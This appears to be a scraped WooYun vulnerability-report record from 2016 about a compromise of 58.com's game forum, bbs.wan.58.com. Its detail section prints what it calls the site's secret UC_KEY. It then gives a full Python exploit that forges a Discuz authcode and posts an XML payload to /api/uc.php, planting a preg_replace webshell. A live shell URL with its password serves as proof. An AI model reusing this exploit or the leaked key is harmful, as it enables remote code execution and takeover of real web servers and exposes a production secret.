{"id": 86212, "wybug_id": "wooyun-2016-0206121", "wybug_title": "58同城某漏洞成功shell（可控制3个网站）", "wybug_corp": "58同城", "wybug_author": "crocodile", "wybug_date": "2016-05-08 10:07", "wybug_open_date": "2016-05-13 10:10", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 58同城 详细说明：  在乌云上发现 58 UC_KEY一个网址 http://bbs.wan.58.comUC_KEY Uet5r701maVbU04eIb49t2f2y021T2c2K3q9Tdi5Q16f35M3w1XeC7Z9n6X353A8用这个方法 import sysimport hashlibimport timeimport mathimport base64import urllib2import urllibimport reimport requestsimport jsonglobal cookieglobal formhashdef microtime(get_as_float = False) :    if get_as_float:        return time.time()    else:        return '%.8f %d' % math.modf(time.time())def get_authcode(string, key = ''):    ckey_length = 4    key = hashlib.md5(key).hexdigest()    keya = hashlib.md5(key[0:16]).hexdigest()    keyb = hashlib.md5(key[16:32]).hexdigest()    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()    key_length = len(cryptkey)    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string    string_length = len(string)    result = ''    box = range(0, 256)    rndkey = dict()    for i in range(0,256):        rndkey[i] = ord(cryptkey[i % key_length])    j=0    for i in range(0,256):        j = (j + box[i] + rndkey[i]) % 256        tmp = box[i]        box[i] = box[j]        box[j] = tmp    a=0    j=0    for i in range(0,string_length):        a = (a + 1) % 256        j = (j + box[a]) % 256        tmp = box[a]        box[a] = box[j]        box[j] = tmp        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))        length=len(result)    return keyc + base64.b64encode(result).replace('=', '')def get_cookie_formhash(host):    global cookie    global formhash    headers = {'content-type': 'application/json'}    r=requests.get(host,headers=headers)    cookie=r.cookies    hash=re.findall(r'formhash\" value=\"[0-9A-z]{1,10}\"',r.text)    _formhash=re.findall(r'\"[0-9A-z]{1,10}\"',hash[0])    formhash=_formhash[0].replace('\"','')def getshell(host,key):    global cookie    global formhash    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}    tm=time.time()+10*3600    agent=hashlib.md5(\"Mozilla/5.0 (Windows NT 6.1; WOW64)\")    string=\"agent=%s&time=%s&action=updatebadwords\" % (agent,tm)    code=urllib.quote(get_authcode(string,key))    get_cookie_formhash(host)    url=\"%s/api/uc.php?code=%s&formhash=%s\" % (host,code,formhash)    payload='''<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root><item id=\"0\"><item id=\"findpattern\">/admin/e</item>  <item id=\"replacement\">@preg_replace(chr(47).chr(47).chr(101),$_POST[c],chr(098));</item>  </item></root>'''    r=requests.post(url,data=payload,cookies=cookie,headers=header)    print url    print r.text    if re.findall('^1',r.text):        print 'success shell is %s/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkusername&username=admin    password is c' % (host)if __name__ == '__main__':    commands=sys.argv[1:2]    keys=sys.argv[2:]    args=\"\".join(commands)    argss=\"\".join(keys)    print args,argss    if len(args) < 5:        sys.exit()    else:        getshell(args,argss)成功 shell   漏洞证明：  http://bbs.wan.58.com/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkusername&username=admin c\n\n\n\n   修复方案：  20吧   版权声明：转载请注明来源 crocodile@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-13 10:10 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-08 10:24 |    \t\tjackyu \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 世界上没有一个系统是绝对安全的，系统最大...)\t\t \n  叼叼叼，想问问是不是命令执行漏洞    \n     2016-05-08 12:36 |    \t\t路人甲7 \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:7        | 噢耶)\t\t \n  居然shell  牛逼    \n     2016-05-13 10:17 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  没看懂...咋个要访问后面那个连接    \n     2016-05-13 10:26 |    \t\tjackyu \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 世界上没有一个系统是绝对安全的，系统最大...)\t\t \n  什么脚本，python exp吗？打包发下    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}